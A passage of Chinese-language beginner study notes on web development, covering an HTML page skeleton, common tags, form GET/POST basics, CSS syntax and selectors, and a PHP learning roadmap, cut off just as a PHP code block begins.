class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span>// 声明为HTML5文档，有助于浏览器正确显示网页</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span>          // 定义网页编码格式为 utf-8</span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>这是一个骨架哟<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>// 包含了可见的页面内容</span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>我的第一个标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>这是一个标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>这是一个标题<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>我的第一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> 为文字设置单独样式</span><br><span class="line"><span class="tag">&lt;<span class="name">q</span>&gt;</span><span class="tag">&lt;/<span class="name">q</span>&gt;</span> 短文本引用</span><br><span class="line"><span class="tag">&lt;<span class="name">blockquote</span>&gt;</span><span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span> 长文本引用</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span> 换行</span><br><span class="line">&amp;nbsp; 空格</span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span> 水平横线</span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span><span class="tag">&lt;/<span class="name">address</span>&gt;</span> 地址信息</span><br><span class="line"><span class="tag">&lt;<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">code</span>&gt;</span> 插入代码</span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span> 插入大段代码（保留原格式）</span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>信息1<span class="tag">&lt;/<span class="name">li</span>&gt;</span>  新闻信息列表（无序）</span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>信息2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>信息1<span class="tag">&lt;/<span class="name">li</span>&gt;</span> 销售排行榜（有序）</span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>信息2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>年龄<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>性别<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="表单与PHP交互"><a href="#表单与PHP交互" class="headerlink" title="表单与PHP交互"></a>表单与PHP交互</h3><p>GET：显示在地址栏，长度有限制，可以资源定位。格式 ? what=flag</p><p>POST：不会显示在地址栏，可用来提交密码</p><p>下列三种按钮皆可在点击时触发表单的submit事件：<a href="http://caibaojian.com/form.html" target="_blank" rel="noopener">原文</a></p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"submit"</span> /&gt;</span><br><span class="line">&lt;button <span class="class"><span class="keyword">type</span></span>=<span class="string">"submit"</span>&gt;&lt;/button&gt;</span><br><span class="line">&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"image"</span> /&gt;</span><br></pre></td></tr></table></figure><h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">selector</span> &#123;</span><br><span class="line">    <span class="attribute">property</span>:value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">h1</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>:red;<span class="comment">/*属性值与单位之间不能留有空格*/</span></span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">14px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*如果值大于1个单词时，则需要加上引号：*/</span></span><br><span class="line"><span class="selector-tag">p</span> &#123;<span class="attribute">font-family</span>:<span class="string">"sans serif"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*外部样式*/</span></span><br><span class="line">&lt;head&gt;&lt;link rel="stylesheet" type="text/css" href="mystyle.css"&gt;&lt;/head&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*内部样式*/</span></span><br><span class="line">&lt;<span class="selector-tag">head</span>&gt;</span><br><span class="line">    &lt;<span class="selector-tag">style</span>&gt;</span><br><span class="line">        <span class="selector-tag">hr</span> &#123;<span class="attribute">color</span>:sienna;&#125;</span><br><span class="line">        <span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>:<span class="number">20px</span>;&#125;</span><br><span class="line">        <span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"images/back40.gif"</span>);&#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*内联样式：单独针对某个元素设置下属性*/</span></span><br><span class="line">&lt;p style="color:sienna;margin-left:20px"&gt;这是一个段落。&lt;/p&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*多重样式:*/</span></span><br><span class="line">如果某些属性在不同的样式表中被同样的选择器定义，属性值将从更具体的样式表中被继承过来。</span><br><span class="line">h3 &#123;  // 外部css</span><br><span class="line">    <span class="selector-tag">color</span><span class="selector-pseudo">:red</span>;</span><br><span class="line">    <span class="selector-tag">text-align</span><span class="selector-pseudo">:left</span>;</span><br><span class="line">    <span class="selector-tag">font-size</span><span class="selector-pseudo">:8pt</span>;</span><br><span class="line">&#125;</span><br><span class="line">h3 &#123;  // 内部css</span><br><span class="line">    <span class="selector-tag">text-align</span><span class="selector-pseudo">:right</span>;</span><br><span class="line">    <span class="selector-tag">font-size</span><span class="selector-pseudo">:20pt</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 最终效果</span></span><br><span class="line"><span class="comment">* color:red;</span></span><br><span class="line"><span class="comment">* text-align:right;</span></span><br><span class="line"><span class="comment">* font-size:20pt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*优先级：*/</span></span><br><span class="line">内联样式 &gt; 内部样式 &gt; 外部样式 &gt; 浏览器默认样式</span><br><span class="line">注意：如果外部样式放在内部样式的后面，则外部样式将覆盖内部样式</span><br><span class="line"></span><br><span class="line"><span class="comment">/*背景*/</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    background-color:#b0c4de;  // 设置元素的背景颜色</span><br><span class="line">    background-image:url('paper.gif');  // 把图像设置为背景</span><br><span class="line">    background-repeat:repeat-x;  // 设置背景图像是否及如何重复</span><br><span class="line">    background-attachment  // 背景图像固定或滚动</span><br><span class="line">    background-position:right top;  // 设置背景图像的起始位置</span><br><span class="line">&#125;</span><br><span class="line">body &#123;background:#ffffff url('img_tree.png') no-repeat;&#125;  // 直接 background 简写属性</span><br><span class="line"></span><br><span class="line"><span class="comment">/*文本格式*/</span></span><br><span class="line">文本颜色</span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">color</span>:red;&#125;</span><br><span class="line">h1,h2,h3 &#123;color:#00ff00;&#125;  // 多个标签用同一个属性</span><br><span class="line"><span class="selector-tag">h2</span> &#123;<span class="attribute">color</span>:<span class="built_in">rgb</span>(255,0,0);&#125;</span><br><span class="line">文本对齐方式</span><br><span class="line"><span class="selector-tag">h1</span> &#123;<span class="attribute">text-align</span>:center;&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.date</span> &#123;<span class="attribute">text-align</span>:right;&#125;</span><br><span class="line">p.main &#123;text-align:justify;&#125;  // 每一行被展开为宽度相等，左，右外边距是对齐（如杂志，报纸）</span><br><span class="line">文本装饰：删除链接的下划线</span><br><span class="line">h1 &#123;text-decoration:overline;&#125;// 上划线</span><br><span class="line">h2 &#123;text-decoration:line-through;&#125;  // 中划线</span><br><span class="line">h3 &#123;text-decoration:underline;&#125;// 下划线</span><br><span class="line">文本转换：大小写</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.uppercase</span> &#123;<span class="attribute">text-transform</span>:uppercase;&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.lowercase</span> &#123;<span class="attribute">text-transform</span>:lowercase;&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.capitalize</span> &#123;<span class="attribute">text-transform</span>:capitalize;&#125;</span><br><span class="line">文本缩进：文本的第一行的缩进</span><br><span class="line"><span class="selector-tag">p</span> &#123;<span class="attribute">text-indent</span>:<span class="number">50px</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*字体*/</span></span><br><span class="line">设置文本的字体系列，应该多设置几个字体名称，如果浏览器不支持第一种字体，他将尝试下一种字体</span><br><span class="line"><span class="selector-tag">p</span>&#123;<span class="attribute">font-family</span>:<span class="string">"Times New Roman"</span>, Times, serif;&#125;  </span><br><span class="line">字体样式</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.normal</span> &#123;<span class="attribute">font-style</span>:normal;&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.italic</span> &#123;<span class="attribute">font-style</span>:italic;&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.oblique</span> &#123;<span class="attribute">font-style</span>:oblique;&#125;</span><br><span class="line">字体大小</span><br><span class="line"><span class="selector-tag">h1</span> &#123;<span class="attribute">font-size</span>:<span class="number">40px</span>;&#125;</span><br><span class="line"><span class="selector-tag">h2</span> &#123;<span class="attribute">font-size</span>:<span class="number">30px</span>;&#125;</span><br><span class="line"><span class="selector-tag">p</span> &#123;<span class="attribute">font-size</span>:<span class="number">14px</span>;&#125;</span><br><span class="line">为了避免Internet Explorer 中无法调整文本的问题，许多开发者使用 em 单位代替像素 1em = 16px</span><br><span class="line">把段落设置为小型大写字母字体</span><br><span class="line"><span class="selector-tag">p</span> &#123;<span class="attribute">font-variant</span>:small-caps;&#125;</span><br><span class="line">字体粗细</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.normal</span> &#123;<span class="attribute">font-weight</span>:normal;&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.thick</span> &#123;<span class="attribute">font-weight</span>:bold;&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.thicker</span> &#123;<span class="attribute">font-weight</span>:<span class="number">900</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*链接*/</span></span><br><span class="line">a:link &#123;color:#000000;&#125;      // 未访问链接</span><br><span class="line">a:visited &#123;color:#00FF00;&#125;  // 已访问链接</span><br><span class="line">a:hover &#123;color:#FF00FF;&#125;  // 鼠标移动到链接上</span><br><span class="line">a:active &#123;color:#0000FF;&#125;  // 鼠标点击时</span><br><span class="line">高级玩法：方框显示</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:link</span>,<span class="selector-tag">a</span><span class="selector-pseudo">:visited</span> &#123;</span><br><span class="line"><span class="attribute">display</span>:block;</span><br><span class="line"><span class="attribute">font-weight</span>:bold;</span><br><span class="line"><span class="attribute">color</span>:<span class="number">#FFFFFF</span>;</span><br><span class="line"><span class="attribute">background-color</span>:<span class="number">#98bf21</span>;</span><br><span class="line"><span class="attribute">width</span>:<span class="number">120px</span>;</span><br><span class="line"><span class="attribute">text-align</span>:center;</span><br><span class="line"><span class="attribute">padding</span>:<span class="number">4px</span>;</span><br><span class="line"><span class="attribute">text-decoration</span>:none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>,<span class="selector-tag">a</span><span class="selector-pseudo">:active</span> &#123;<span class="attribute">background-color</span>:<span class="number">#7A991A</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*列表*/</span></span><br><span class="line">列表项标记样式</span><br><span class="line"><span class="selector-tag">ul</span><span class="selector-class">.a</span> &#123;<span class="attribute">list-style-type</span>: circle;&#125;</span><br><span class="line"><span class="selector-tag">ul</span><span class="selector-class">.b</span> &#123;<span class="attribute">list-style-type</span>: square;&#125;</span><br><span class="line"><span class="selector-tag">ol</span><span class="selector-class">.c</span> &#123;<span class="attribute">list-style-type</span>: upper-roman;&#125;</span><br><span class="line"><span class="selector-tag">ol</span><span class="selector-class">.d</span> &#123;<span class="attribute">list-style-type</span>: lower-alpha;&#125;</span><br><span class="line">标记的背景图像</span><br><span class="line"><span class="selector-tag">ul</span> &#123;<span class="attribute">list-style-image</span>: <span class="built_in">url</span>(<span class="string">'sqpurple.gif'</span>);&#125;</span><br><span class="line">简写</span><br><span class="line"><span class="selector-tag">ul</span> &#123;<span class="attribute">list-style</span>: square <span class="built_in">url</span>(<span class="string">"sqpurple.gif"</span>);&#125;</span><br><span class="line">位置</span><br><span class="line"><span class="selector-tag">ul</span> &#123;<span class="attribute">list-style-position</span>: inside;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*表格*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/**/</span></span><br></pre></td></tr></table></figure><h3 id="派生选择器"><a href="#派生选择器" class="headerlink" title="派生选择器"></a>派生选择器</h3><p>依据元素在其位置的上下文关系来定义样式，可以使标记更加简洁</p><h3 id="id-选择器"><a href="#id-选择器" class="headerlink" title="id 选择器"></a>id 选择器</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id="idd"&gt; 这是一个div &lt;/div&gt;</span><br><span class="line"><span class="selector-id">#idd</span> &#123;<span class="attribute">proprety</span>:value;&#125;</span><br></pre></td></tr></table></figure><h3 id="类选择器"><a href="#类选择器" class="headerlink" title="类选择器"></a>类选择器</h3><h3 id="属性选择器"><a href="#属性选择器" class="headerlink" title="属性选择器"></a>属性选择器</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[属性=值]</span> &#123;&#125;</span><br></pre></td></tr></table></figure><h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><ul><li><p>(1) 熟悉HTML/CSS/JS等网页基本元素，完成阶段可自行制作简单的网页，对元素属性相对熟悉。</p></li><li><p>(2) 理解动态语言的概念和运做机制，熟悉基本的PHP语法。</p></li><li><p>(3) 学习如何将PHP与HTML结合起来，完成简单的动态页面。</p></li><li><p>(4) 接触学习MySQL，开始设计数据库。</p></li><li><p>(5) 不断巩固PHP语法，熟悉大部分的PHP常用函数，理解面向对象编程、MySQL优化，以及一些模板框架。</p></li><li><p>(6) 最终完成一个功能齐全的动态站点。</p><hr></li><li><p>新手不要看到上面的概括就以为PHP学习是很简单的，编程是需要你认真的思考和不断的实践。下面具体解释一下PHP的学习线路。首先，任何网站都是由网页组成的，也就是说想完成一个网站，必须先学会做网页，掌握静态网页的制作技术是学习开发网站的先决条件。因此我们要学习HTML，为今后制作网站打下基础。学习HTML应该边学边做，HTML中的任何元素都要亲自实践，只有明白了什么元素会起到什么效果之后，才能深刻记忆，一味的看书是不行的。</p></li><li>假设你已经可以完成一个静态页面了，那么就该开始了解动态语言，刚一接触动态语言，可能很多人都会有很多不解，代码不是作为直接输出的，而是要经过处理的，HTML是经过HTML解析器，而PHP也要通过PHP解析器，跟学习HTML一样的道理，想让任何的解析器工作，就必须使用它专用的语法结构。</li><li>学习PHP，你应该感到幸运，因为如果你学过其他语言，你就会发现PHP还是相对简单的，这一阶段，你要搞清楚HTML和PHP的概念，你现在完全可以让PHP给你算算一加一等于几，然后在浏览器输出。不要觉得幼稚，这虽然是很小的一段代码，但是对于你的编程之路，可是迈出了一大步。不过现在，你还是一个菜鸟。</li><li>接下来就要学习数据库了，MySQL可以说是PHP的黄金搭档，我们要征服这个数据库，在你理解了数据库的概念之后，就要尝试通过PHP来连接数据库，进而会用PHP成功的插入，删除和更新数据。</li><li>这个时候，你可能会处于这种状态：你会HTML吗？会，我能编好几个表格排板的网页呢！你会PHP吗？会，我会把一加一的运算写在函数里，然后调用！你会MySQL吗？会，我可以把数据库里的数据插入删除啦！</li><li>那接下来该做什么呢？尝试着做个小的留言本吧，这同样是新手面临的一道关卡。花了一段时间，你终于学会把表单的数据插入数据库，然后显示出来了，应该说一个程序的雏形已经诞生了。但是，你可能会看人家这个编论坛，那个开发CMS，我什么时候可以写一个呢？不要急，再巩固一下知识，熟悉了PHP和MySQL开发的要领后，再回头看你写的那个留言本，你也许会怀疑那真的是你写的吗？这个时候，你可以完善一下你写的留言本。留言本应该加入注册以及分页的功能，可以的话，UI也可以加强。</li><li>这就算学会了吗？NO，NO，NO，还早呢，你到现在还没碰过OOP呢吧？那模板和框架呢？还要继续学习呀！PHP框架提供了一个用以构建web应用的基本框架，从而简化了用PHP编写web应用程序的流程。可以节省开发时间、有助于建立更稳定的应用。所以说，PHP框架是一个可以用来节省时间并强化自己代码的工具。当你第一次选择PHP框架时，建议多尝试几个，每个框架都有自己的长处和短处，例如Zend框架由于多样的功能、并且有一个广泛的支持系统，流行了很长时间。而CakePHP是一个晚于Zend的PHP框架，相应的支持系统也比较少，但是更为方便和易于使用。</li><li>了解了面向对象和框架后，你应该接触一下XML了，总而言之，你绝对不会发现你全部都学会了，学无止境！学东西，永远不要妄想有速成这一说，技巧再多，但是缺少努力，那也是白搭。有一点可以保证，就是你学会了PHP，那么再学其它语言，肯定速成，反过来也一样，如果你之前学过其它的语言，那么学PHP肯定快。</li><li>多借鉴别人成功的代码，绝对是有益无害，所以要多看那些经过千锤百炼凝出来的经典代码，是进步的最好方法。另外，要强调的是，学习一项技术过程中可能会遇到困难，可能会迷茫，你也许学了一半的PHP，又开始打C#的主意，或者有人说Java很好，这个时候你绝对不能动摇，要坚持到底，彻底学会。祝你顺利学成PHP，开发自己想要的网站。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span 